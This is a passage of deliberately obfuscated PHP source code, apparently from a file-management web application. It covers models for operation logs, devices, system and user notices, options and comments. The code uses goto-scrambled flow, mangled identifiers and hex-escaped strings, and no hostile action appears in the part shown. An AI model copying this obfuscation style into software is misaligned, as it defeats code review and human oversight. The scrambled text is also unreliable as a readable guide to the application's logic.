(!isset($D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[75]]) || strpos($cî˜ª¶ÂÄÂ[$AæÚ„¢¢Ñ°[29]], $AæÚ„¢¢Ñ°[2068]) !== 0) { continue; } try { $cä÷Š‰´¹ = IO::infoFull($D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[75]]); } catch (Exception $D˜ƒ×ˆÃŸ) { continue; } $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[390]] = $cä÷Š‰´¹[$AæÚ„¢¢Ñ°[390]]; $a¬¡ÄêÓª«[] = $D¡ïÆ·¾ğ•[$AæÚ„¢¢Ñ°[1884]] = $cä÷Š‰´¹[$AæÚ„¢¢Ñ°[472]]; $c‰ §Ê‚Æ×[$EÕ‚Í»‡¡][$AæÚ„¢¢Ñ°[425]] = json_encode($D¡ïÆ·¾ğ•); continue; } goto E¥ÍŠëÜƒô; f×®Ì–·§ô: } if (!$a¬¡ÄêÓª«) { return array(); } return Model($AæÚ„¢¢Ñ°[769])->sourceListInfo($a¬¡ÄêÓª«, !0); } private function logList($C‰”ÆİÇ¿) { goto c÷ÃØÅ‹°; c÷ÃØÅ‹°: $f«‰¹Ï´ÍŸ =& $_SERVER[µ…]; $D¿õ©ÇĞÛ¾ = array_to_keyvalue($C‰”ÆİÇ¿, $f«‰¹Ï´ÍŸ[33], $f«‰¹Ï´ÍŸ[1506]); $E»¼Áïê = Model($f«‰¹Ï´ÍŸ[501])->userListInfo(array_unique($D¿õ©ÇĞÛ¾)); goto e™–Å°«Íê; e™–Å°«Íê: $E»»šÈ‡ß = $this->getSourceList($C‰”ÆİÇ¿); $E¬£ÄëêÆ¹ = $this->typeAll(); $c¾Òõóƒ¬ = array(); goto A«ñÇáš³¢; A«ñÇáš³¢: $dê°ì”Ê¹ë = array(); foreach ($C‰”ÆİÇ¿ as $B°©³Îš‰Ó => $Fƒô‡’ç•¦) { goto fñº‰½ÑÂÉ; Aç¨êêõ¨: $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[1827]] = $cµ¡…ä‰¦; $EàÔ‘ƒí‡ì = json_decode($Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[425]], !0); $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[2064]] = isset($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[2064]]) ? $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[2064]] : $f«‰¹Ï´ÍŸ[33]; goto a¡ôÓ¾‡Ê; fñº‰½ÑÂÉ: $cØ…¹†ÔÎĞ = $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[29]]; $cµ¡…ä‰¦ = isset($E»¼Áïê[$Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[1506]]]) ? $E»¼Áïê[$Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[1506]]] : !1; $FÒÈù°²§« = strpos($cØ…¹†ÔÎĞ, $f«‰¹Ï´ÍŸ[2069]) === 0 ? LNG($f«‰¹Ï´ÍŸ[2070]) : LNG($f«‰¹Ï´ÍŸ[2065]); goto e×åíš§‡‘; fÌ–ĞĞÇù¿: unset($Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[2071]]); $c¾Òõóƒ¬[] = $Fƒô‡’ç•¦; goto fô‰Ó¦‹Ä²; e×åíš§‡‘: $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[28]] = isset($cµ¡…ä‰¦[$f«‰¹Ï´ÍŸ[28]]) ? $cµ¡…ä‰¦[$f«‰¹Ï´ÍŸ[28]] : LNG($f«‰¹Ï´ÍŸ[2065]); $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[1933]] = isset($cµ¡…ä‰¦[$f«‰¹Ï´ÍŸ[1933]]) ? $cµ¡…ä‰¦[$f«‰¹Ï´ÍŸ[1933]] : $f«‰¹Ï´ÍŸ[33]; $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[1411]] = isset($E¬£ÄëêÆ¹[$cØ…¹†ÔÎĞ]) ? $E¬£ÄëêÆ¹[$cØ…¹†ÔÎĞ] : $FÒÈù°²§«; goto Aç¨êêõ¨; a¡ôÓ¾‡Ê: $this->ipAddress($Fƒô‡’ç•¦); if (strpos($cØ…¹†ÔÎĞ, $f«‰¹Ï´ÍŸ[1885]) === 0 || isset($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1884]])) { goto fô™¢Íõ; fô™¢Íõ: $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[84]] = $E»»šÈ‡ß[$EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[390]]]; $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1897]] = $E»»šÈ‡ß[$EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1884]]]; if ($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[29]] == $f«‰¹Ï´ÍŸ[515]) { $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[425]][$f«‰¹Ï´ÍŸ[1032]] = $E»»šÈ‡ß[$EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[425]][$f«‰¹Ï´ÍŸ[1032]]]; $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[425]][$f«‰¹Ï´ÍŸ[1033]] = $E»»šÈ‡ß[$EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[425]][$f«‰¹Ï´ÍŸ[1033]]]; } goto E‹ò…¡£¸ò; E‹ò…¡£¸ò: if ($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[29]] == $f«‰¹Ï´ÍŸ[1892]) { $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[425]][$f«‰¹Ï´ÍŸ[390]] = $E»»šÈ‡ß[$EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[425]][$f«‰¹Ï´ÍŸ[390]]]; } if ($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[29]] == $f«‰¹Ï´ÍŸ[1635]) { $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1897]] = $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[84]]; $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1884]] = $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1897]][$f«‰¹Ï´ÍŸ[390]]; $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[84]] = !1; $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[390]] = $f«‰¹Ï´ÍŸ[33]; } if ($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[84]] && $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[84]][$f«‰¹Ï´ÍŸ[398]] == $f«‰¹Ï´ÍŸ[1146]) { $dê°ì”Ê¹ë[] = $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[388]]; unset($C‰”ÆİÇ¿[$B°©³Îš‰Ó]); continue; } goto DÌõœ®Â È; DÌõœ®Â È: if ($EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1897]] && $EàÔ‘ƒí‡ì[$f«‰¹Ï´ÍŸ[1897]][$f«‰¹Ï´ÍŸ[398]] == $f«‰¹Ï´ÍŸ[1146]) { $dê°ì”Ê¹ë[] = $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[388]]; unset($C‰”ÆİÇ¿[$B°©³Îš‰Ó]); continue; } goto FÄìèĞ«µ; FÄìèĞ«µ: } $Fƒô‡’ç•¦[$f«‰¹Ï´ÍŸ[425]] = $EàÔ‘ƒí‡ì; goto fÌ–ĞĞÇù¿; fô‰Ó¦‹Ä²: } $this->clearSystemPathLog($dê°ì”Ê¹ë); goto dÛ„¥èÆ­ç; dÛ„¥èÆ­ç: return $c¾Òõóƒ¬; goto EÆ‚™ÒºØ‰; EÆ‚™ÒºØ‰: } private function clearSystemPathLog($Fà­§œ±•Š) { $Bì¤£õÑ» =& $_SERVER[µ…]; if (count($Fà­§œ±•Š) == 0) { return; } $D…ÃÌÜ§Ë = array($Bì¤£õÑ»[388] => array($Bì¤£õÑ»[7], array_unique($Fà­§œ±•Š))); $this->where($D…ÃÌÜ§Ë)->delete(); } public function deviceList($CŒëĞÛ±Ü¶, $B…èÒ¸àí´ = 0) { $cƒ½‚Ÿ·º =& $_SERVER[µ…]; $F‹Ÿƒ²„†µ = array($cƒ½‚Ÿ·º[1506] => $CŒëĞÛ±Ü¶, $cƒ½‚Ÿ·º[192] => array($cƒ½‚Ÿ·º[949], $B…èÒ¸àí´), $cƒ½‚Ÿ·º[29] => $cƒ½‚Ÿ·º[1609]); $C¬ÄùˆîÒ = array(); $aí’Úª—œÃ = $this->field($cƒ½‚Ÿ·º[2072])->where($F‹Ÿƒ²„†µ)->order($cƒ½‚Ÿ·º[1895])->limit(50)->select(); foreach ($aí’Úª—œÃ as $F²«Î¬Šğ => $DŞğ‰¯Ğ·) { goto BÏàˆô ‚; Dª¸óÌ¢Ş‚: $this->ipAddress($DŞğ‰¯Ğ·); $DŞğ‰¯Ğ·[$cƒ½‚Ÿ·º[425]] = $c­¡Èæì´¸; $C¬ÄùˆîÒ[$DÅªíŠåø] = $DŞğ‰¯Ğ·; goto C‹ÈîÎ¦…ø; c±ƒÇ¹™í…: unset($c­¡Èæì´¸[$cƒ½‚Ÿ·º[2064]]); $DÅªíŠåø = $this->deviceType($c­¡Èæì´¸[$cƒ½‚Ÿ·º[1886]]); if (isset($C¬ÄùˆîÒ[$DÅªíŠåø])) { continue; } goto Dª¸óÌ¢Ş‚; BÏàˆô ‚: if ($F²«Î¬Šğ > 0 && abs($DŞğ‰¯Ğ·[$cƒ½‚Ÿ·º[192]] - $aí’Úª—œÃ[$F²«Î¬Šğ - 1][$cƒ½‚Ÿ·º[192]]) < 5) { continue; } $c­¡Èæì´¸ = json_decode($DŞğ‰¯Ğ·[$cƒ½‚Ÿ·º[425]], !0); $DŞğ‰¯Ğ·[$cƒ½‚Ÿ·º[2064]] = isset($c­¡Èæì´¸[$cƒ½‚Ÿ·º[2064]]) ? $c­¡Èæì´¸[$cƒ½‚Ÿ·º[2064]] : $cƒ½‚Ÿ·º[33]; goto c±ƒÇ¹™í…; C‹ÈîÎ¦…ø: } return array_values($C¬ÄùˆîÒ); } public function deviceType($D¬ª—ã‘ë·) { return $D¬ª—ã‘ë·; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x6e\x6f\164\151\143\x65\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\143\x6f\x6e\x74\x65\x6e\x74", "\x61\x75\x74\150", "\x6d\157\x64\x65", "\x74\x69\155\x65", "\164\171\160\x65", "\x6c\x65\166\145\x6c", "\145\x6e\x61\142\x6c\145", "\x73\157\x72\x74"); public function listData($D Î¶åõºê = false, $B¤‘ìÇ‹®ƒ = "\x73\x6f\x72\x74", $F«›‘© = false) { return parent::listData($D Î¶åõºê, $B¤‘ìÇ‹®ƒ, $F«›‘©); } public function add($CÕƒåÊ‚ª’) { $A„îÆ¶’äĞ =& $_SERVER[µ…]; $E™´š¾† = time(); if ($CÕƒåÊ‚ª’[$A„îÆ¶’äĞ[12]] == $A„îÆ¶’äĞ[2073]) { $E™´š¾† = strtotime($CÕƒåÊ‚ª’[$A„îÆ¶’äĞ[195]]); } $CÕƒåÊ‚ª’[$A„îÆ¶’äĞ[195]] = $E™´š¾†; return parent::insert($CÕƒåÊ‚ª’); } public function update($dîæé‡¦, $D¢²Ã×‹Èò) { goto aŒùŒ·›‹; aŒùŒ·›‹: $e‘¿•Ø—ğè =& $_SERVER[µ…]; $bò†ƒ‘¥˜ = $this->listData($dîæé‡¦); if (!$bò†ƒ‘¥˜) { return !1; } goto fœÄÈÑ²°Œ; cùò¡¹ƒ ´: return parent::update($dîæé‡¦, $D¢²Ã×‹Èò); goto C±Ì¦Ö“; fœÄÈÑ²°Œ: $d¤ØøÂì = time(); if ($D¢²Ã×‹Èò[$e‘¿•Ø—ğè[12]] == $e‘¿•Ø—ğè[2073]) { $d¤ØøÂì = strtotime($D¢²Ã×‹Èò[$e‘¿•Ø—ğè[195]]); } $D¢²Ã×‹Èò[$e‘¿•Ø—ğè[195]] = $d¤ØøÂì; goto cùò¡¹ƒ ´; C±Ì¦Ö“: } public function remove($aİÙÑµÇ‹°) { $Eªìô×©ã“ = $this->listData($aİÙÑµÇ‹°); if (!$Eªìô×©ã“ || $Eªìô×©ã“[$_SERVER[µ…][1146]]) { return !1; } return parent::remove($aİÙÑµÇ‹°); } public function sort($e”×º²¥ô, $fÂ±‰Ó¦›) { return parent::update($e”×º²¥ô, $fÂ±‰Ó¦›); } public function enable($fÖí¿®ÓÖ—, $f¡£İˆŸ¾ë) { return parent::update($fÖí¿®ÓÖ—, array($_SERVER[µ…][2074] => $f¡£İˆŸ¾ë)); } private function initUserOption() { $cæø‹ª·¥Ş =& $_SERVER[µ…]; $this->optionType = $cæø‹ª·¥Ş[2075]; $this->modelType = $cæø‹ª·¥Ş[2076]; $this->field = array($cæø‹ª·¥Ş[2077], $cæø‹ª·¥Ş[28], $cæø‹ª·¥Ş[195], $cæø‹ª·¥Ş[29], $cæø‹ª·¥Ş[2078], $cæø‹ª·¥Ş[704], $cæø‹ª·¥Ş[188]); } public function userNoticeGet($e´ö¯¶½”“ = false) { $this->initUserOption(); return parent::listData($e´ö¯¶½”“, $_SERVER[µ…][388], !0); } public function userNoticeAdd($AïÀ‘Ê„Ñ) { $a³¼ôİ÷¾ =& $_SERVER[µ…]; $this->initUserOption(); $fßŞœÌ±âø = $this->findByKey($a³¼ôİ÷¾[2077], $AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[388]]); if ($fßŞœÌ±âø) { return !0; } $bùªŸÇÕÓÄ = array($a³¼ôİ÷¾[2077] => $AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[388]], $a³¼ôİ÷¾[28] => $AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[28]], $a³¼ôİ÷¾[195] => $AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[195]], $a³¼ôİ÷¾[29] => isset($AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[29]]) ? $AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[29]] : 1, $a³¼ôİ÷¾[2078] => isset($AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[2078]]) ? $AïÀ‘Ê„Ñ[$a³¼ôİ÷¾[2078]] : 0, $a³¼ôİ÷¾[704] => 0, $a³¼ôİ÷¾[188] => 0); return parent::insert($bùªŸÇÕÓÄ); } public function userNoticeEdit($c‰ÚÃÇèØ, $BÛ¶Ù›ÓİÑ) { $this->initUserOption(); return parent::update($c‰ÚÃÇèØ, $BÛ¶Ù›ÓİÑ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\155\137\157\160\164\x69\157\x6e"; protected $jsonField = array("\155\x65\156\165", "\162\x6f\x6c\145", "\162\157\154\145\107\x72\157\x75\x70", "\x72\x65\147\151\x73\x74", "\145\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($béèÓŸ¿Ëß) { return "\x53\171\x73\x74\x65\x6d\117\160\164\151\157\x6e\137{$béèÓŸ¿Ëß}"; } protected function optionDefault($eŞÉº‹¯á† = '') { $bíĞÎâæŠƒ =& $_SERVER[µ…]; if ($eŞÉº‹¯á† == $bíĞÎâæŠƒ[33]) { return $GLOBALS[$bíĞÎâæŠƒ[6]][$bíĞÎâæŠƒ[376]]; } } } goto dŒ‘‰‘Ï™; F—áĞèœ•ƒ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\x6d\x65" => "\x63\x6f\155\155\x65\x6e\x74\x5f\x6d\x65\x74\x61", "\155\x65\164\141\x46\x69\x65\x6c\144" => "\143\157\x6d\155\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($dŒÊñ‹„İ) { $FÇ£¸ÙÚ‡ô =& $_SERVER[µ…]; if ($dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[1697]]) { $bì½ß‘Õøí = $this->where(array($FÇ£¸ÙÚ‡ô[1698] => $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[1697]]))->find(); if (!$bì½ß‘Õøí || $bì½ß‘Õøí[$FÇ£¸ÙÚ‡ô[398]] != $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[398]] || $bì½ß‘Õøí[$FÇ£¸ÙÚ‡ô[478]] != $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[478]]) { return !1; } $this->where(array($FÇ£¸ÙÚ‡ô[1698] => $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[1697]]))->setAdd($FÇ£¸ÙÚ‡ô[1699], 1); } $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[1700]] = 0; $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[1699]] = 0; $dŒÊñ‹„İ[$FÇ£¸ÙÚ‡ô[704]] = 1; return $this->add($dŒÊñ‹„İ); } public function commentCount($Fòò‚É‚Îß, $e’‡ĞäîëÓ) { goto a‘§¶é½; a‘§¶é½: $Fˆà½®®¡ =& $_SERVER[µ…]; if (!$Fòò‚É‚Îß) { return array(); } if (is_string($Fòò‚É‚Îß) || is_int($Fòò‚É‚Îß)) { $Fòò‚É‚Îß = array($Fòò‚É‚Îß); } goto Cç·„è—; Cç·„è—: $c‘£ÚŸÖÑø = array($Fˆà½®®¡[478], $Fˆà½®®¡[1701] => $Fˆà½®®¡[474]); $E¾Õ„µîä = array($Fˆà½®®¡[478] => array($Fˆà½®®¡[7], $Fòò‚É‚Îß), $Fˆà½®®¡[398] => $e’‡ĞäîëÓ); $a¾õ¢ç»›œ = $this->field($c‘£ÚŸÖÑø)->where($E¾Õ„µîä)->group($Fˆà½®®¡[478])->select(); goto EÛ»ŞÆºÄ¼; EÛ»ŞÆºÄ¼: return array_to_keyvalue($a¾õ¢ç»›œ, $Fˆà½®®¡[478], $Fˆà½®®¡[474]); goto c¶•¾ˆŸ”; c¶•¾ˆŸ”: } public function remove($Aé¢ò¥ñÆ) { $B«Œ‚ÊÄÂÓ =& $_SERVER[µ…]; $E—“Œç‡µ = array($B«Œ‚ÊÄÂÓ[1698] => $Aé¢ò¥ñÆ); $aÚÓì°© = $this->where($E—“Œç‡µ)->find(); if ($aÚÓì°©[$B«Œ‚ÊÄÂÓ[1697]]) { $this->where(array($B«Œ‚ÊÄÂÓ[1698] => $aÚÓì°©[$B«Œ‚ÊÄÂÓ[1697]]))->setAdd($B«Œ‚ÊÄÂÓ[1699], -1); } return $this->where($E—“Œç‡µ)->delete(); } public function edit($FÉŸ•ŠÁÍ¤, $fÕ¼ ä³„Ÿ) { $E¥éò±¸Ä =& $_SERVER[µ…]; $fğ£´œ¥ = array($E¥éò±¸Ä[1698] => $FÉŸ•ŠÁÍ¤); return $this->where($fğ£´œ¥)->save(array($E¥éò±¸Ä[1702] => $fÕ¼ ä³„Ÿ)); } public function prasise($B×‚õ¥ÄÚ) { $Aòöóøä„¶ =& $_SERVER[µ…]; $Aãìãº¢¯ = Model($Aòöóøä„¶[1703]); $D¿Ö«ñÒ°‹ = array($Aòöóøä„¶[1698] => $B×‚õ¥ÄÚ, $Aòöóøä„¶[1498] => USER_ID); $AçÄÙ”‡İ = $Aãìãº¢¯->where($D¿Ö«ñÒ°‹)->find(); if (!$AçÄÙ”‡İ) { $Aãìãº¢¯->add($D¿Ö«ñÒ°‹); $eĞˆº–Çª = $this->where(array($Aòöóøä„¶[1698] => $B×‚õ¥ÄÚ))->setAdd($Aòöóøä„¶[1700], 1); } else { $Aãìãº¢¯->where($D¿Ö«ñÒ°‹)->delete(); $eĞˆº–Çª = $this->where(array($Aòöóøä„¶[1698] => $B×‚õ¥ÄÚ))->setAdd($Aòöóøä„¶[1700], -1); } return $eĞˆº–Çª; } public function targetInfo($FµçÎœ…åÁ, $c®‘å–ŸŞ) { goto FéÖ‡†ÆÁ; Aè¯ù›¥Œ³: $bƒÆ…Ó„èë = "\122\x49\107\110\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x63\157\155\155\x65\x6e\164\x5f\160\x72\x61\151\163\145\x20\163\164\141\162\x20\x6f\156\40\143\157\x6d\155\x65\x6e\x74\x2e\x63\x6f\155\x6d\x65\156\x74\x49\104\x20\x3d\40\x73\164\141\x72\x2e\x63\x6f\155\x6d\x65\156\164\111\x44"; $eß¢ïÄ…„ñ = $this->alias($f«Ïä±ÆÖ×[350])->where($CäÎêåÇÕ—)->join($bƒÆ…Ó„èë, $f«Ïä±ÆÖ×[1704])->count(); $b±Á«‡ÑËÀ = array($f«Ïä±ÆÖ×[1705] => $C¿óóô‘, $f«Ïä±ÆÖ×[1706] => $eß¢ïÄ…„ñ); goto a§­ŠÙ¼¨; a§­ŠÙ¼¨: return $b±Á«‡ÑËÀ; goto añãôÑ‰Ö; FéÖ‡†ÆÁ: $f«Ïä±ÆÖ× =& $_SERVER[µ…]; $CäÎêåÇÕ— = array($f«Ïä±ÆÖ×[544] => $FµçÎœ…åÁ, $f«Ïä±ÆÖ×[545] => $c®‘å–ŸŞ); $C¿óóô‘ = $this->where($CäÎêåÇÕ—)->count(); goto Aè¯ù›¥Œ³; añãôÑ‰Ö: } public function listData($eãğË±°‡›) { $d”ÛÓ‡ˆ¸ï =& $_SERVER[µ…]; if (isset($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1707]])) { if ($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1707]]) { $eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1708]] = array($d”ÛÓ‡ˆ¸ï[949], intval($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1707]])); } unset($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1707]]); } if (isset($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1709]])) { if ($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1709]]) { $eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1708]] = array($d”ÛÓ‡ˆ¸ï[946], intval($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1709]])); } unset($eãğË±°‡›[$d”ÛÓ‡ˆ¸ï[1709]]); } return $this->_listData($eãğË±°‡›); } private function _listData($FÙù¹•ß«¼) { $F²ØÛÓ§‰Ğ =& $_SERVER[µ…]; $DÂ±¿–§ = $this->where($FÙù¹•ß«¼)->_makeOrder()->selectPage(100); $this->_listAppendParent($DÂ±¿–§[$F²ØÛÓ§‰Ğ[365]]); $this->_listAppendUser($DÂ±¿–§[$F²ØÛÓ§‰Ğ[365]]); $this->_listAppendMeta($DÂ±¿–§[$F²ØÛÓ§‰Ğ[365]]); return $DÂ±¿–§; } private function _makeOrder() { $B„æ•äŠÂÇ =& $_SERVER[µ…]; $Aóº§ò•‰â = array($B„æ•äŠÂÇ[1700], $B„æ•äŠÂÇ[1699], $B„æ•äŠÂÇ[192]); $DÍ¦Üê¹Î = Input::get($B„æ•äŠÂÇ[429], $B„æ•äŠÂÇ[7], $B„æ•äŠÂÇ[410], $Aóº§ò•‰â); $Dí·ºó±Ì = Input::get($B„æ•äŠÂÇ[430], $B„æ•äŠÂÇ[7], $B„æ•äŠÂÇ[1500], array($B„æ•äŠÂÇ[1710], $B„æ•äŠÂÇ[425])); $e÷‹ßï°ª = $DÍ¦Üê¹Î . $B„æ•äŠÂÇ[50] . $Dí·ºó±Ì; return $this->order($e÷‹ßï°ª); } private function _listAppendParent(&$a›¾½Íó‰£) { goto e»Æ¯‚îóß; e÷ĞİïÎõ´: foreach ($a›¾½Íó‰£ as &$c´ÆîÍ§í) { if (isset($bš¢Š¥›ŸĞ[$c´ÆîÍ§í[$Aâšãù•‡Š[1697]]])) { $c´ÆîÍ§í[$Aâšãù•‡Š[1711]] = $bš¢Š¥›ŸĞ[$c´ÆîÍ§í[$Aâšãù•‡Š[1697]]]; } } unset($c´ÆîÍ§í); goto aÁ½óøôøÂ; e»Æ¯‚îóß: $Aâšãù•‡Š =& $_SERVER[µ…]; $CØˆˆ‚í…Ì = array_unique(array_to_keyvalue($a›¾½Íó‰£, $Aâšãù•‡Š[33], $Aâšãù•‡Š[1697])); $CØˆˆ‚í…Ì = array_remove_value($CØˆˆ‚í…Ì, $Aâšãù•‡Š[491]); goto cæ©Ê†À; cæ©Ê†À: if (!$CØˆˆ‚í…Ì) { return; } $bš¢Š¥›ŸĞ = $this->where(array($Aâšãù•‡Š[1698] => array($Aâšãù•‡Š[7], $CØˆˆ‚í…Ì)))->select(); $bš¢Š¥›ŸĞ = array_to_keyvalue($bš¢Š¥›ŸĞ, $Aâšãù•‡Š[1708]); goto e÷ĞİïÎõ´; aÁ½óøôøÂ: } private function _listAppendUser(&$Dİ¢÷ˆù½) { goto bÚæ÷‰›Ô‡; eù£¹Å‚†: foreach ($Dİ¢÷ˆù½ as &$eÌ½ŸÕòé½) { $eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[557]] = $dÚ–¡ ±œ¼[$eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[1506]]]; if (isset($eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[1711]])) { $eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[1711]][$fÏ£ô¯ğ³À[557]] = $dÚ–¡ ±œ¼[$eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[1711]][$fÏ£ô¯ğ³À[1506]]]; } } unset($eÌ½ŸÕòé½); goto Aá¡ÙÛİö; D¨ÊãßÃ¤: if (count($BÌš¢³†ˆÍ) == 0) { return; } foreach ($Dİ¢÷ˆù½ as $eÌ½ŸÕòé½) { if (isset($eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[1711]])) { $BÌš¢³†ˆÍ[] = $eÌ½ŸÕòé½[$fÏ£ô¯ğ³À[1711]][$fÏ£ô¯ğ³À[1506]]; } } $dÚ–¡ ±œ¼ = Model($fÏ£ô¯ğ³À[501])->userListInfo($BÌš¢³†ˆÍ); goto eù£¹Å‚†; bÚæ÷‰›Ô‡: $fÏ£ô¯ğ³À =& $_SERVER[µ…]; $BÌš¢³†ˆÍ = array_unique(array_to_keyvalue($Dİ¢÷ˆù½, $fÏ£ô¯ğ³À[33], $fÏ£ô¯ğ³À[1506])); $BÌš¢³†ˆÍ = array_remove_value($BÌš¢³†ˆÍ, $fÏ£ô¯ğ³À[491]); goto D¨ÊãßÃ¤; Aá¡ÙÛİö: } private function _listAppendMeta(&$Aˆ°‰Ÿ˜ÁÌ) { goto eÑÛïù×®²; CÛ‚Û°ŒÚ: if (!$CçÜÁïÖ…) { return; } foreach ($Aˆ°‰Ÿ˜ÁÌ as $a·‘¿’ğŒÙ) { if (isset($a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[1711]])) { $CçÜÁïÖ…[] = $a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[1711]][$C´¸ìÑ—çÊ[1708]]; } } $B©Ì­Ãä§ = $this->metaList($CçÜÁïÖ…); goto B×…¤‘Òò; B×…¤‘Òò: if (!$B©Ì­Ãä§) { return !1; } foreach ($Aˆ°‰Ÿ˜ÁÌ as &$a·‘¿’ğŒÙ) { $a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[439]] = $B©Ì­Ãä§[$a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[1708]]]; if (isset($a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[1711]])) { $a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[1711]][$C´¸ìÑ—çÊ[439]] = $B©Ì­Ãä§[$a·‘¿’ğŒÙ[$C´¸ìÑ—çÊ[1711]][$C´¸ìÑ—çÊ[1708]]]; } } unset($a·‘¿’ğŒÙ); goto D˜ôŸ‰ß¹Í; eÑÛïù×®²: $C´¸ìÑ—çÊ =& $_SERVER[µ…]; $CçÜÁïÖ… = array_unique(array_to_keyvalue($Aˆ°‰Ÿ˜ÁÌ, $C´¸ìÑ—çÊ[33], $C´¸ìÑ—çÊ[1708])); $CçÜÁïÖ… = array_remove_value($CçÜÁïÖ…, $C´¸ìÑ—çÊ[491]); goto CÛ‚Û°ŒÚ; D˜ôŸ‰ß¹Í: } private function metaList($Dãí¬²¢‹) { goto D…±µƒ…Ëœ; f½•²¥²·ø: return $f¶ÎÄÅ¬Ô ? $f¶ÎÄÅ¬Ô : array(); goto Cßî‘¦…±; E™ã¶è„…Ô: $f¶ÎÄÅ¬Ô = Model($a®Ğé„¡×ô[1712])->where($fø²íİ„ÕÆ)->select(); $f¶ÎÄÅ¬Ô = array_to_keyvalue_group($f¶ÎÄÅ¬Ô, $a®Ğé„¡×ô[1708]); foreach ($f¶ÎÄÅ¬Ô as $B†Û–è±ù => $d¤Ó¦ï ) { $Báæ„Áª¤ = array(); foreach ($d¤Ó¦ï  as $BË“¬ËåßØ) { $Báæ„Áª¤[$BË“¬ËåßØ[$a®Ğé„¡×ô[92]]] = $BË“¬ËåßØ[$a®Ğé„¡×ô[370]]; } $f¶ÎÄÅ¬Ô[$B†Û–è±ù] = $Báæ„Áª¤; } goto f½•²¥²·ø; D…±µƒ…Ëœ: $a®Ğé„¡×ô =& 